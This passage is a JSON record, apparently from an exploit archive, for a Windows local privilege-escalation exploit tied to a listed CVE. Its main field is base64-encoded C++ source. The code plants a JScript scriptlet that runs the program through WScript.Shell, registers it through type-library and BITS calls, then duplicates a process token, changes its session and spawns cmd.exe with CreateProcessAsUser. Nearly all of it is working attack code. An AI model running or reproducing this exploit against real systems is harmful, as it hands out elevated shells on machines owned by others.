NjcmlwdGxldF9zdGFydFtdID0gTCI8P3htbCB2ZXJzaW9uPScxLjAnPz5cclxuPHBhY2thZ2U+XHJcbjxjb21wb25lbnQgaWQ9J2dpZmZpbGUnPlxyXG4iDQoiPHJlZ2lzdHJhdGlvbiBkZXNjcmlwdGlvbj0nRHVtbXknIHByb2dpZD0nZ2lmZmlsZScgdmVyc2lvbj0nMS4wMCcgcmVtb3RhYmxlPSdUcnVlJz5cclxuIlwNCiI8L3JlZ2lzdHJhdGlvbj5cclxuIlwNCiI8c2NyaXB0IGxhbmd1YWdlPSdKU2NyaXB0Jz5cclxuIlwNCiI8IVtDREFUQVtcclxuIlwNCiIgIG5ldyBBY3RpdmVYT2JqZWN0KCdXc2NyaXB0LlNoZWxsJykuZXhlYygnIjsNCg0KY29uc3Qgd2NoYXJfdCBzY3JpcHRsZXRfZW5kW10gPSBMIicpO1xyXG4iXA0KIl1dPlxyXG4iXA0KIjwvc2NyaXB0PlxyXG4iXA0KIjwvY29tcG9uZW50PlxyXG4iXA0KIjwvcGFja2FnZT5cclxuIjsNCg0KYnN0cl90IENyZWF0ZVNjcmlwdGxldEZpbGUoKQ0Kew0KCWJzdHJfdCBzY3JpcHRfZmlsZSA9IEdldEV4ZURpcigpICsgTCJcXHJ1bi5zY3QiOw0KCWJzdHJfdCBzY3JpcHRfZGF0YSA9IHNjcmlwdGxldF9zdGFydDsNCglic3RyX3QgZXhlX2ZpbGUgPSBHZXRFeGUoKTsNCgl3Y2hhcl90KiBwID0gZXhlX2ZpbGU7DQoJd2hpbGUgKCpwKQ0KCXsNCgkJaWYgKCpwID09ICdcXCcpDQoJCXsNCgkJCSpwID0gJy8nOw0KCQl9DQoJCXArKzsNCgl9DQoNCglEV09SRCBzZXNzaW9uX2lkOw0KCVByb2Nlc3NJZFRvU2Vzc2lvbklkKEdldEN1cnJlbnRQcm9jZXNzSWQoKSwgJnNlc3Npb25faWQpOw0KCVdDSEFSIHNlc3Npb25fc3RyWzE2XTsNCglTdHJpbmdDY2hQcmludGYoc2Vzc2lvbl9zdHIsIF9jb3VudG9mKHNlc3Npb25fc3RyKSwgTCIlZCIsIHNlc3Npb25faWQpOw0KDQoJc2NyaXB0X2RhdGEgKz0gTCJcIiIgKyBleGVfZmlsZSArIEwiXCIgIiArIHNlc3Npb25fc3RyICsgc2NyaXB0bGV0X2VuZDsNCg0KCVdyaXRlRmlsZShzY3JpcHRfZmlsZSwgc2NyaXB0X2RhdGEpOw0KDQoJcmV0dXJuIHNjcmlwdF9maWxlOw0KfQ0KDQp2b2lkIENyZWF0ZU5ld1Byb2Nlc3MoY29uc3Qgd2NoYXJfdCogc2Vzc2lvbikNCnsNCglEV09SRCBzZXNzaW9uX2lkID0gd2NzdG91bChzZXNzaW9uLCBudWxscHRyLCAwKTsNCglTY29wZWRIYW5kbGUgdG9rZW47DQoJaWYgKCFPcGVuUHJvY2Vzc1Rva2VuKEdldEN1cnJlbnRQcm9jZXNzKCksIFRPS0VOX0FMTF9BQ0NFU1MsIHRva2VuLnB0cigpKSkNCgl7DQoJCXRocm93IF9jb21fZXJyb3IoRV9GQUlMKTsNCgl9DQoNCglTY29wZWRIYW5kbGUgbmV3X3Rva2VuOw0KDQoJaWYgKCFEdXBsaWNhdGVUb2tlbkV4KHRva2VuLmdldCgpLCBUT0tFTl9BTExfQUNDRVNTLCBudWxscHRyLCBTZWN1cml0eUFub255bW91cywgVG9rZW5QcmltYXJ5LCBuZXdfdG9rZW4ucHRyKCkpKQ0KCXsNCgkJdGhyb3cgX2NvbV9lcnJvcihFX0ZBSUwpOw0KCX0NCg0KCVNldFRva2VuSW5mb3JtYXRpb24obmV3X3Rva2VuLmdldCgpLCBUb2tlblNlc3Npb25JZCwgJnNlc3Npb25faWQsIHNpemVvZihzZXNzaW9uX2lkKSk7DQoNCglTVEFSVFVQSU5GTyBzdGFydF9pbmZvID0ge307DQoJc3RhcnRfaW5mby5jYiA9IHNpemVvZihzdGFydF9pbmZvKTsNCglzdGFydF9pbmZvLmxwRGVza3RvcCA9IEwiV2luU3RhMFxcRGVmYXVsdCI7DQoJUFJPQ0VTU19JTkZPUk1BVElPTiBwcm9jX2luZm87DQoJV0NIQVIgY21kbGluZVtdID0gTCJjbWQuZXhlIjsNCglpZiAoQ3JlYXRlUHJvY2Vzc0FzVXNlcihuZXdfdG9rZW4uZ2V0KCksIG51bGxwdHIsIGNtZGxpbmUsDQoJCW51bGxwdHIsIG51bGxwdHIsIEZBTFNFLCBDUkVBVEVfTkVXX0NPTlNPTEUsIG51bGxwdHIsIG51bGxwdHIsICZzdGFydF9pbmZvLCAmcHJvY19pbmZvKSkNCgl7DQoJCUNsb3NlSGFuZGxlKHByb2NfaW5mby5oUHJvY2Vzcyk7DQoJCUNsb3NlSGFuZGxlKHByb2NfaW5mby5oVGhyZWFkKTsNCgl9DQp9DQoNCmludCB3bWFpbihpbnQgYXJnYywgd2NoYXJfdCoqIGFyZ3YpDQp7DQoJdHJ5DQoJew0KCQlDb0luaXQgY2k7DQoJCWlmIChhcmdjID4gMSkNCgkJew0KCQkJQ3JlYXRlTmV3UHJvY2Vzcyhhcmd2WzFdKTsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCWJzdHJfdCBzY3JpcHQgPSBMInNjcmlwdDoiICsgQ3JlYXRlU2NyaXB0bGV0RmlsZSgpOw0KCQkJQnVpbGRUeXBlTGlicyhzY3JpcHQpOw0KCQkJVGVzdEJpdHMoKTsNCgkJfQ0KCX0NCgljYXRjaCAoY29uc3QgX2NvbV9lcnJvciYgZXJyKQ0KCXsNCgkJcHJpbnRmKCJFcnJvcjogJWxzXG4iLCBlcnIuRXJyb3JNZXNzYWdlKCkpOw0KCX0NCg0KICAgIHJldHVybiAwOw0KfQ==", 
    "filename": "platforms/windows/local/42020.cpp", 
    "id": "42020", 
    "cves": [
        "CVE-2015-1644"
    ]
}